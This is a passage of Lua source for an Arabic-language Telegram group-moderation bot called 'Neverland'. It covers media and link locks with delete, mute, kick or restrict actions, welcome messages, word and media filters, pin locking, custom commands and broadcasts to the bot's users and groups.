database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVoice" and not Vips(msg) then     
if database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and not Vips(msg) then     
if database:get(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageSticker" and not Vips(msg) then     
if database:get(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Owner(msg) then     
if database:get(bot_id.."Neverland:Lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."Neverland:Lock:forward"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."Neverland:Lock:forward"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."Neverland:Lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageDocument" and not Vips(msg) then     
if database:get(bot_id.."Neverland:Lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Document"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Document"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Vips(msg) then      
if database:get(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Vips(msg) then
if database:get(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 

if tonumber(msg.via_bot_user_id_) ~= 0 and not Vips(msg) then
if database:get(bot_id.."Neverland:Lock:Inlen"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Inlen"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Inlen"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Inlen"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end 


--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageContact" and not Vips(msg) then      
if database:get(bot_id.."Neverland:Lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Contact"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Contact"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Vips(msg) then  
local _nl, ctrl_ = string.gsub(text, "%c", "")  
local _nl, real_ = string.gsub(text, "%d", "")   
sens = 400  
if database:get(bot_id.."Neverland:Lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" then
if tonumber(msg.sender_user_id_) == tonumber(1391769117) then
send(msg.chat_id_, msg.id_,'هلا حبيبي وتجراسي نيفرلاند مطوريي .')
return false 
end
if database:get(bot_id.."Status:lock:kanser"..msg.chat_id_) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
local last_ = data.last_name_ or ''
local first_ = data.first_name_ or ''
local Alsh = (first_..''..last_)
local Min = (database:get(bot_id..'Min:kansers'..msg.chat_id_) or 25)
if string.len(Alsh) > tonumber(Min) then
send(msg.chat_id_, msg.id_,'\n✦┇الكانسر مقفول يرجى زغرفه اسمك اولاً\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉  ┉ ┉ ┉ ┉\n[✦┇ اضغط هنا لزغرفه اسمك.](https://t.me/Zk7_bot)')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
end
end,nil)   
return false
end
local status_welcome = database:get(bot_id.."Neverland:Chek:Welcome"..msg.chat_id_)
if status_welcome and not database:get(bot_id.."Neverland:Status:Lock:tagservr"..msg.chat_id_) then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id.."Neverland:Get:Welcome:Group"..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = "\n✦┇نورت حبي \n✦┇name \n✦┇user" 
end 
t = t:gsub("name",result.first_name_) 
t = t:gsub("user",("@"..result.username_ or "لا يوجد")) 
send(msg.chat_id_, msg.id_,t)
end,nil) 
end 
end 
-------------------------------------------------------
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(bot_id) then 
database:set(bot_id.."Neverland:Pin:Id:Msg"..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = database:get(bot_id.."Neverland:Pin:Id:Msg"..msg.chat_id_)
if Msg_Pin and database:get(bot_id.."Neverland:lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
------------------------------------------------------
if msg.content_.photo_ then  
if database:get(bot_id.."Neverland:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"✦┇عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
database:del(bot_id.."Neverland:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"✦┇ليس لدي صلاحية تغيير معلومات المجموعه يرجى المحاوله لاحقا") 
database:del(bot_id.."Neverland:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,"✦┇تم تغيير صورة المجموعه") 
end
end, nil) 
database:del(bot_id.."Neverland:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
end   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Neverland:Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == "الغاء" then 
send(msg.chat_id_, msg.id_,"✦┇تم الغاء وضع الوصف") 
database:del(bot_id.."Neverland:Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Neverland:Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request("https://api.telegram.org/bot"..token.."/setChatDescription?chat_id="..msg.chat_id_.."&description="..text) 
send(msg.chat_id_, msg.id_,"✦┇تم تغيير وصف المجموعه")   
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Neverland:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == "الغاء" then 
send(msg.chat_id_, msg.id_,"✦┇تم الغاء حفظ الترحيب") 
database:del(bot_id.."Neverland:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Neverland:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id.."Neverland:Get:Welcome:Group"..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"✦┇تم حفظ ترحيب المجموعه")   
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Neverland:Set:PNeverlandvate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"✦┇تم الغاء حفظ الرابط")       
database:del(bot_id.."Neverland:Set:PNeverlandvate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_,"✦┇تم حفظ الرابط بنجاح")       
database:del(bot_id.."Neverland:Set:PNeverlandvate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 

if database:get(bot_id.."Neverland:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✦┇" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء الاذاعه للخاص") 
database:del(bot_id.."Neverland:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'Neverland:UsersBot')  
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_,"✦┇تمت الاذاعه الى *~ "..#list.." ~* مشترك في الخاص ")     
database:del(bot_id.."Neverland:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end

if database:get(bot_id.."Neverland:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✦┇" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء الاذاعه") 
database:del(bot_id.."Neverland:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_,"✦┇تمت الاذاعه الى *~ "..#list.." ~* مجموعه ")     
database:del(bot_id.."Neverland:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end

if database:get(bot_id.."Neverland:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✦┇" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء الاذاعه") 
database:del(bot_id.."Neverland:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id.."Chek:Groups")   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_,"✦┇تمت الاذاعه الى *~ "..#list.." ~* مجموعه ")     
database:del(bot_id.."Neverland:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
if database:get(bot_id.."Neverland:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✦┇" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء الاذاعه") 
database:del(bot_id.."Neverland:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id.."Neverland:UsersBot")   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_,"✦┇تمت الاذاعه الى *~ "..#list.." ~* مشترك في الخاص ")     
database:del(bot_id.."Neverland:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end

--------------------------------------------------------------------------------------------------------------
if text and not VIP_DeV(msg) then  
local Neverland_Msg = database:sismember(bot_id.."Neverland:List:Filter:text"..msg.chat_id_,text) 
if Neverland_Msg then    
Reply_Status(msg,msg.sender_user_id_,"reply","✦┇الكلمه ممنوعه من المجموعه")  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
if msg.content_.ID == 'MessageAnimation' and not VIP_DeV(msg) then      
local geAni = database:sismember(bot_id.."Neverland:List:Filter:Animation"..msg.chat_id_,msg.content_.animation_.animation_.persistent_id_) 
if geAni then        
Reply_Status(msg,msg.sender_user_id_,"reply","✦┇المتحركه ممنوعه من المجموعه")  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
if msg.content_.ID == 'MessageSticker' and not VIP_DeV(msg) then      
local ker = database:sismember(bot_id.."Neverland:List:Filter:Sticker"..msg.chat_id_,msg.content_.sticker_.sticker_.persistent_id_) 
if ker then        
Reply_Status(msg,msg.sender_user_id_,"reply","✦┇الملصق ممنوع من المجموعه")  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
if msg.content_.ID == 'MessagePhoto' and not VIP_DeV(msg) then      
local phh = database:sismember(bot_id.."Neverland:List:Filter:Photo"..msg.chat_id_,msg.content_.photo_.sizes_[1].photo_.persistent_id_) 
if phh then        
Reply_Status(msg,msg.sender_user_id_,"reply","✦┇الصوره ممنوعه من المجموعه")  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
if database:get(bot_id.."Neverland:Set:Name:Bot"..msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✦┇" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء حفظ اسم البوت") 
database:del(bot_id.."Neverland:Set:Name:Bot"..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."Neverland:Set:Name:Bot"..msg.sender_user_id_) 
database:set(bot_id.."Neverland:Name:Bot",text) 
send(msg.chat_id_, msg.id_, "✦┇تم حفظ اسم البوت")  
return false
end 
if text and database:get(bot_id.."Neverland:Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
database:set(bot_id.."Neverland:Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"✦┇ارسل الامر الجديد ليتم وضعه مكان القديم")  
database:del(bot_id.."Neverland:Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
database:set(bot_id.."Neverland:Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and database:get(bot_id.."Neverland:Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = database:get(bot_id.."Neverland:Set:Cmd:Group:New"..msg.chat_id_)
database:set(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
database:sadd(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"✦┇تم حفظ الامر باسم ↜ { "..text..' }')  
database:del(bot_id.."Neverland:Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' then
if ChekAdd(msg.chat_id_) == true then
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) or (msg.content_.voice_) or (msg.content_.audio_) and msg.reply_to_message_id_ == 0 then      
database:sadd(bot_id.."Neverland:allM"..msg.chat_id_, msg.id_)
end
if (msg.content_.text_) or (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) or (msg.content_.voice_) or (msg.content_.audio_) then
if database:get(bot_id.."y:msg:media"..msg.chat_id_) then    
local gmedia = database:scard(bot_id.."Neverland:allM"..msg.chat_id_)  
local Numbardel = database:get(bot_id.."Neverland:allM:numdel"..msg.chat_id_)  or 200
if gmedia >= tonumber(Numbardel) then
local liste = database:smembers(bot_id.."Neverland:allM"..msg.chat_id_)
for k,v in pairs(liste) do
local Mesge = v
if Mesge then
t = "✦┇تم مسح "..k.." من الوسائط تلقائيا\n✦┇يمكنك تعطيل الميزه بستخدام الامر ( `تعطيل المسح التلقائي` )"
DeleteMessage(msg.chat_id_,{[0]=Mesge})
end
end
send(msg.chat_id_, msg.id_, t)
database:del(bot_id.."Neverland:allM"..msg.chat_id_)
end
end
end
if text and text:match("^ضع عدد المسح (%d+)$") and BasicConstructor(msg) then  
local Numbardel = text:match("^ضع عدد المسح (%d+)$")
database:set(bot_id.."Neverland:allM:numdel"..msg.chat_id_,Numbardel) 
send(msg.chat_id_, msg.id_, 'تم تعيين العدد  الى : '..Numbardel)
end
if text == ("امسح") and BasicConstructor(msg) then  
local list = database:smembers(bot_id.."Neverland:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "✦┇تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."Neverland:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = "✦┇لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("الميديا") and BasicConstructor(msg) then  
local gmria = database:scard(bot_id.."Neverland:allM"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"✦┇عدد الميديا الموجود هو (* "..gmria.." *)")
end
if text == "تعطيل المسح التلقائي" and BasicConstructor(msg) then        
database:del(bot_id.."y:msg:media"..msg.chat_id_)
Reply_Status(msg,msg.sender_user_id_,"lock",'✦┇تم تعطيل المسح التلقائي للميديا')
return false
end 
if text == "تفعيل المسح التلقائي" and BasicConstructor(msg) then        
database:set(bot_id.."y:msg:media"..msg.chat_id_,true)
Reply_Status(msg,msg.sender_user_id_,"lock",'✦┇تم تفعيل المسح التلقائي للميديا')
return false
end 
if text == "قفل الدردشه" and msg.reply_to_message_id_ == 0 and Owner(msg) then 
database:set(bot_id.."Neverland:Lock:text"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل الدردشه*")  
return false
end 
if text == 'فتح السوبر' and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:del(bot_id..'lock:tajkervrbot'..msg.chat_id_)   
list ={"lock:hashtak","lock:user:name","lock:Spam","lock:forward","lock:Cmd","lock:text","lock:Fshar","lock:Azag","lock:edit","lock:inline","lock:forward","lock:Keyboard"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم فتح السوبر*")  
return false
end,nil)   
end
if text == 'قفل السوبر' and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'✦┇عـليك الاشـتࢪاك في قنـاة البـوت اولآ . \n ✦┇قنـاة البـوت ↜  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id..'lock:tajkervrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل السوبر*")  
return false
end,nil)   
end
if text == "قفل الاضافه" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id.."Neverland:Lock:AddMempar"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل اضافة الاعضاء*")  
return false
end 
if text == "قفل الدخول" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id.."Neverland:Lock:Join"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل دخول الاعضاء*")  
return false
end 
if text == "قفل البوتات" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id.."Neverland:Lock:Bot:kick"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل البوتات*")  
return false
end 
if text == "قفل البوتات بالطرد" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id.."Neverland:Lock:Bot:kick"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","*✦┇تم قفـل البوتات*")  
return false
end 
if text == "قفل الاشعارات" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
database:set(bot_id.."Neverland:Lock:tagservr"..msg.chat_id_,true)  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل الاشعارات*")  
return false
end 
if text == "قفل التثبيت" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."Neverland:lockpin"..msg.chat_id_, true) 
database:sadd(bot_id.."Neverland:Lock:pin",msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  database:set(bot_id.."Neverland:Pin:Id:Msg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل التثبيت هنا*")  
return false
end 
